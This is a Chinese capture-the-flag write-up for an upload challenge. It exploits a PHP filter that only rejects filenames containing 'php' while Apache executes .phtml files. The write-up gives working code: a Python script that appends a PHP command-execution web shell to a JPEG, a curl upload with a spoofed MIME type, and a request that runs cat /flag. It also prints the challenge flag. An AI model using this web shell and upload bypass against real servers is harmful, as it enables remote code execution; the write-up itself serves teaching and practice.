# picture

## 题目简述

上传接口同时检查文件大小、客户端声明的 MIME 和 `getimagesize()` 识别结果，但文件名过滤与 Apache PHP 后缀配置不一致。Apache 会把 `.pht`、`.phtml` 等后缀交给 PHP 解释器，因此可以上传“真实 JPEG 数据 + PHP 代码”的图片马并读取 `/flag`。

## 解题过程

`upload.php` 的主要限制为：

```php
if ($file["size"] > 20480) {
    exit("文件过大！");
}
$ima = getimagesize($file["tmp_name"]);
if ($file["type"] == "image/jpeg" || $file["type"] == "image/jpg") {
    if (strpos($file["name"], "php")) {
        echo "文件名包含 php";
    } elseif (!$ima || $ima["mime"] != "image/jpeg") {
        echo "不是 jpg";
    } else {
        move_uploaded_file($file["tmp_name"], $fileName);
    }
}
```

而 Apache 配置明确匹配：

```apache
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

因此 `.phtml` 不含连续字符串 `php`，却会被 Apache 当作 PHP。先准备一张小于 20 KiB 的正常 JPEG，再在末尾追加 PHP 代码；`getimagesize()` 仍会根据 JPEG 文件头识别成功：

```python
from pathlib import Path

jpeg = Path("cover.jpg").read_bytes()
php = b'<?php system($_REQUEST["cmd"]); ?>'
Path("shell.phtml").write_bytes(jpeg + php)
```

上传时同时控制文件名和 multipart MIME：

```bash
curl -s \
  -F 'file=@shell.phtml;type=image/jpeg;filename=shell.phtml' \
  'http://TARGET/upload.php'
```

响应会给出随机化后的保存路径，例如 `uploads/<uniqid>-shell.phtml`。访问该路径并传入命令：

```text
http://TARGET/uploads/<uniqid>-shell.phtml?cmd=cat%20/flag
```

响应开头可能混有原 JPEG 字节，搜索 `0xgame{` 即可得到：

```text
0xgame{fab7eb4b-7cba-49f9-b45c-29223be0a089}
```

此外，`strpos()` 返回匹配下标，而 PHP 会把下标 `0` 当作假值，所以以 `php` 开头的文件名还存在额外逻辑缺陷；但使用 `.phtml` 已足以稳定利用。

## 方法总结

上传校验必须同时结合应用过滤和 Web 服务器解析规则分析。本题的突破点是允许的真实 JPEG 内容与危险的 `.phtml` 解析后缀可以共存；文件大小、MIME、图片头和后缀四个条件都满足后即可执行 PHP。
